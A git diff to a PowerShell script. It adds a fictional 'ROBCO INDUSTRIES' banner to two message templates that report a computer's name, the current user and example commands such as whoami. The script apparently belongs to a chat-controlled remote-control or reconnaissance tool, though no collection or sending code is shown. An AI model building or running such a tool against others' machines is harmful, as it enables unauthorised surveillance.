@@ -208,6 +208,9 @@ Function quickInfo{
             @{
                 title       = "$env:COMPUTERNAME | Computer Information "
                 "description" = @"
+`````ROBCO INDUSTRIES UNIFIED OPERATING SYSTEM``````
+```````COPYTIGHT 2075-2077 ROBCO INDUSTRIES``````
+
 ``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
 :man_detective: **User Information** :man_detective:
 - **Current User**          : ``$env:USERNAME``
@@ -332,7 +335,9 @@ $script:jsonPayload = @{
         @{
             title       = "$env:COMPUTERNAME | Extra Information "
             "description" = @"
-``````Example Commands``````
+`````ROBCO INDUSTRIES UNIFIED OPERATING SYSTEM``````
+```````COPYTIGHT 2075-2077 ROBCO INDUSTRIES``````
+         ``````Example Commands``````
 
 **Default PS Commands:**
 > PS> ``whoami`` (Returns Powershell commands)
